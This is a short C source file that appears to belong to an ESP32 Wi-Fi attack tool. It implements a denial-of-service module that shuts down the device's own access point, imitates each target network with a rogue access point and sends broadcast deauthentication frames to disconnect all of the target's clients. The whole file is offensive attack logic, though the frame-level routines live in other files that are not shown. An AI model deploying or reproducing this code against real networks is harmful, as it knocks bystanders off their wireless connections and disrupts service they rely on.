/*
 * attack_dos.c — Denial of Service attack module
 * 
 * Uses rogue AP + broadcast deauth from attack_methods
 * Rogue AP: Creates fake AP beacon to confuse clients
 * Broadcast deauth: Sends deauth to all clients on channel
 */

#include "attack_dos.h"
#include "wifi_controller.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "attack_methods.h"

static const char *TAG = "attack_dos";

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS on %d targets...", attack_config->target_count);
    
    wifictl_mgmt_ap_stop();
    
    for (int i = 0; i < attack_config->target_count; i++) {
        const wifi_ap_record_t *ap = attack_config->ap_records[i];
        
        // Start rogue AP to confuse clients (fake beacon flooding)
        attack_method_rogueap(ap);
        
        // Send broadcast deauth to disconnect all clients
        attack_method_broadcast(ap, 1);
    }
}

void attack_dos_stop(void) {
    attack_method_broadcast_stop();
    attack_method_rogueap_stop();
    wifictl_restore_ap_mac();
    wifictl_mgmt_ap_start();
    ESP_LOGI(TAG, "DoS attack fully stopped");
}
